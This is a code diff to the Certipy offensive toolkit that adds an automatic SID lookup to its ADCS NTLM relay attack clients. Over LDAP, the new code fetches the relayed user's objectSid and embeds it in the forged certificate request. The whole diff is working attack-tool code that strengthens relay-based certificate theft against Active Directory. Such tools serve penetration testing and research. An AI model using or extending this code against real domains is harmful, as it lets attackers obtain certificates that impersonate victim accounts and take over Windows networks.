@@ -63,6 +63,7 @@ from certipy.lib.req import (
     web_retrieve,
 )
 from certipy.lib.target import DnsResolver, Target
+from certipy.lib.ldap import LDAPConnection
 
 
 class ADCSHTTPRelayServer(HTTPRelayClient):
@@ -523,12 +524,16 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         if template is None:
             template = "Machine" if self.username.endswith("$") else "User"
 
+        alt_sid = self.adcs_relay.alt_sid
+        if not alt_sid and self.adcs_relay.auto_sid:
+            alt_sid = self.adcs_relay.get_sid_for_user(self.username)
+
         # Generate certificate signing request
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.alt_dns,
             alt_upn=self.adcs_relay.alt_upn,
-            alt_sid=self.adcs_relay.alt_sid,
+            alt_sid=alt_sid,
             subject=self.adcs_relay.subject,
             key_size=self.adcs_relay.key_size,
             application_policies=self.adcs_relay.application_policies,
@@ -556,7 +561,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             template,
             alt_dns=self.adcs_relay.alt_dns,
             alt_upn=self.adcs_relay.alt_upn,
-            alt_sid=self.adcs_relay.alt_sid,
+            alt_sid=alt_sid,
         )
 
         result = web_request(
@@ -575,7 +580,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 key,
                 self.client.user,
                 self.adcs_relay.subject,
-                self.adcs_relay.alt_sid,
+                alt_sid,
                 self.adcs_relay.out,
                 self.adcs_relay.pfx_password,
             )
@@ -717,12 +722,16 @@ class ADCSRPCAttackClient(ProtocolAttack):
             f"Requesting certificate for user {self.username!r} with template {template!r}"
         )
 
+        alt_sid = self.adcs_relay.alt_sid
+        if not alt_sid and self.adcs_relay.auto_sid:
+            alt_sid = self.adcs_relay.get_sid_for_user(self.username)
+
         # Generate certificate signing request
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.alt_dns,
             alt_upn=self.adcs_relay.alt_upn,
-            alt_sid=self.adcs_relay.alt_sid,
+            alt_sid=alt_sid,
             subject=self.adcs_relay.subject,
             key_size=self.adcs_relay.key_size,
             application_policies=self.adcs_relay.application_policies,
@@ -749,7 +758,7 @@ class ADCSRPCAttackClient(ProtocolAttack):
             template,
             alt_dns=self.adcs_relay.alt_dns,
             alt_upn=self.adcs_relay.alt_upn,
-            alt_sid=self.adcs_relay.alt_sid,
+            alt_sid=alt_sid,
         )
 
         # Submit certificate request
@@ -764,7 +773,7 @@ class ADCSRPCAttackClient(ProtocolAttack):
             key,
             self.username,
             self.adcs_relay.subject,
-            self.adcs_relay.alt_sid,
+            alt_sid,
             self.adcs_relay.out,
             self.adcs_relay.pfx_password,
         )
@@ -808,6 +817,7 @@ class Relay:
         no_skip: bool = False,
         timeout: int = 5,
         enum_templates: bool = False,
+        auto_sid: bool = False,
         **kwargs,  # type: ignore
     ):
         """
@@ -834,6 +844,7 @@ class Relay:
             no_skip: Don't skip already attacked targets
             timeout: Connection timeout in seconds
             enum_templates: Enumerate available templates instead of requesting certificate
+            auto_sid: Automatically fetch the Object SID of the relayed user
             kwargs: Additional arguments
         """
         self.target = target
@@ -855,6 +866,7 @@ class Relay:
         self.interface = interface
         self.port = port
         self.enum_templates = enum_templates
+        self.auto_sid = auto_sid
         self.kwargs = kwargs
         self.key: Optional[rsa.RSAPrivateKey] = None
 
@@ -1021,6 +1033,43 @@ class Relay:
             Configured RPC attack client
         """
         return ADCSRPCAttackClient(self, *args, **kwargs)
+
+    def get_sid_for_user(self, username: str) -> Optional[str]:
+        """
+        Fetch the Object SID for a given username from LDAP.
+
+        Args:
+            username: Username to look up (samAccountName)
+
+        Returns:
+            Object SID as string, or None if lookup fails
+        """
+        if not self.kwargs.get("username"):
+            logging.debug(
+                "No LDAP credentials provided, cannot fetch SID automatically"
+            )
+            return None
+
+        try:
+            target = Target(
+                DnsResolver.create(),
+                **self.kwargs,
+            )
+
+            connection = LDAPConnection(target)
+            connection.connect()
+
+            user = connection.get_user(username)
+            if user:
+                sid = user.get("objectSid")
+                if sid:
+                    logging.info(f"Automatically fetched SID for {username!r}: {sid}")
+                    return sid
+
+        except Exception as e:
+            logging.debug(f"Failed to fetch SID for {username!r}: {e}")
+
+        return None
 
     def shutdown(self) -> None:
         """
